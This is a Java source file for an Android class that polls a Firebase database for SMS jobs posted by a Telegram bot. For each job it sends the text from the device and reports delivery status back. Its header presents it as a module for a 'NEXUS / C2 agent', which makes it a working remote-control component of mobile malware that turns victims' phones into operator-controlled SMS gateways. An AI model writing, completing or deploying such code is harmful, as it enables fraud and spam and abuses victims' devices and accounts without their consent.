/**
 * Android fragment / service piece that listens for SMS jobs
 * written by the Telegram bot under:
 *   devices/{deviceId}/sendSms/{jobId}
 *
 * Drop into your existing NEXUS / C2 agent or a minimal foreground service.
 * Requires:
 *   - SEND_SMS permission
 *   - Firebase Realtime Database SDK
 *   - device online + battery optimization disabled
 */

package com.example.smsgateway;

import android.Manifest;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Build;
import android.telephony.SmsManager;
import android.util.Log;

import androidx.core.content.ContextCompat;

import com.google.firebase.database.ChildEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.util.HashMap;
import java.util.Map;

public class AndroidSmsListener {

    private static final String TAG = "SmsListener";
    private final Context ctx;
    private final String deviceId;
    private DatabaseReference jobsRef;
    private ChildEventListener childListener;

    public AndroidSmsListener(Context context, String deviceId) {
        this.ctx = context.getApplicationContext();
        this.deviceId = deviceId;
    }

    /** Call from Service.onCreate() or after Firebase auth */
    public void start() {
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.SEND_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "SEND_SMS permission missing");
            return;
        }

        FirebaseDatabase db = FirebaseDatabase.getInstance();
        // Keep connection alive for low-latency job pickup
        db.getReference(".info/connected").addValueEventListener(new ValueEventListener() {
            @Override public void onDataChange(DataSnapshot s) {
                Boolean connected = s.getValue(Boolean.class);
                Log.i(TAG, "Firebase connected: " + connected);
            }
            @Override public void onCancelled(DatabaseError e) {}
        });

        jobsRef = db.getReference("devices").child(deviceId).child("sendSms");
        childListener = new ChildEventListener() {
            @Override
            public void onChildAdded(DataSnapshot snapshot, String previousChildName) {
                handleJob(snapshot);
            }
            @Override public void onChildChanged(DataSnapshot s, String p) {}
            @Override public void onChildRemoved(DataSnapshot s) {}
            @Override public void onChildMoved(DataSnapshot s, String p) {}
            @Override public void onCancelled(DatabaseError e) {
                Log.e(TAG, "jobs listener cancelled: " + e.getMessage());
            }
        };
        jobsRef.addChildEventListener(childListener);
        Log.i(TAG, "Listening on devices/" + deviceId + "/sendSms");
    }

    public void stop() {
        if (jobsRef != null && childListener != null) {
            jobsRef.removeEventListener(childListener);
        }
    }

    private void handleJob(DataSnapshot snapshot) {
        String jobId = snapshot.getKey();
        if (jobId == null) return;

        String status = snapshot.child("status").getValue(String.class);
        if (!"pending".equals(status)) return; // already processed

        String to = snapshot.child("to").getValue(String.class);
        String body = snapshot.child("body").getValue(String.class);
        Integer sim = snapshot.child("sim").getValue(Integer.class);
        if (sim == null) sim = 1;

        if (to == null || body == null || to.isEmpty() || body.isEmpty()) {
            mark(jobId, "error", "missing to/body");
            return;
        }

        // Mark processing immediately to avoid double-send
        mark(jobId, "sending", null);

        try {
            sendSms(to, body, sim, jobId);
        } catch (Exception e) {
            Log.e(TAG, "send failed", e);
            mark(jobId, "failed", e.getMessage());
        }
    }

    private void sendSms(String to, String body, int simSlot, String jobId) {
        // SENT + DELIVERED tracking
        String sentAction = "SMS_SENT_" + jobId;
        String delivAction = "SMS_DELIVERED_" + jobId;

        PendingIntent sentPi = PendingIntent.getBroadcast(
                ctx, jobId.hashCode(),
                new Intent(sentAction),
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);

        PendingIntent delivPi = PendingIntent.getBroadcast(
                ctx, jobId.hashCode() + 1,
                new Intent(delivAction),
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);

        BroadcastReceiver sentReceiver = new BroadcastReceiver() {
            @Override public void onReceive(Context c, Intent i) {
                int result = getResultCode();
                if (result == android.app.Activity.RESULT_OK) {
                    mark(jobId, "sent", null);
                } else {
                    mark(jobId, "failed", "sent result=" + result);
                }
                try { ctx.unregisterReceiver(this); } catch (Exception ignored) {}
            }
        };
        BroadcastReceiver delivReceiver = new BroadcastReceiver() {
            @Override public void onReceive(Context c, Intent i) {
                int result = getResultCode();
                if (result == android.app.Activity.RESULT_OK) {
                    mark(jobId, "delivered", null);
                }
                try { ctx.unregisterReceiver(this); } catch (Exception ignored) {}
            }
        };

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ctx.registerReceiver(sentReceiver, new IntentFilter(sentAction), Context.RECEIVER_NOT_EXPORTED);
            ctx.registerReceiver(delivReceiver, new IntentFilter(delivAction), Context.RECEIVER_NOT_EXPORTED);
        } else {
            ctx.registerReceiver(sentReceiver, new IntentFilter(sentAction));
            ctx.registerReceiver(delivReceiver, new IntentFilter(delivAction));
        }

        SmsManager sms;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            // Prefer subscription-based manager for dual-SIM
            // You can resolve subscriptionId from SubscriptionManager for exact SIM
            sms = SmsManager.getDefault();
        } else {
            sms = SmsManager.getDefault();
        }

        // Split long messages
        if (body.length() > 160) {
            for (String part : sms.divideMessage(body)) {
                sms.sendTextMessage(to, null, part, sentPi, delivPi);
            }
        } else {
            sms.sendTextMessage(to, null, body, sentPi, delivPi);
        }
        Log.i(TAG, "SMS dispatched job=" + jobId + " to=" + to);
    }

    private void mark(String jobId, String status, String error) {
        Map<String, Object> upd = new HashMap<>();
        upd.put("status", status);
        upd.put("updatedAt", System.currentTimeMillis());
        if (error != null) upd.put("error", error);
        jobsRef.child(jobId).updateChildren(upd);
    }
}
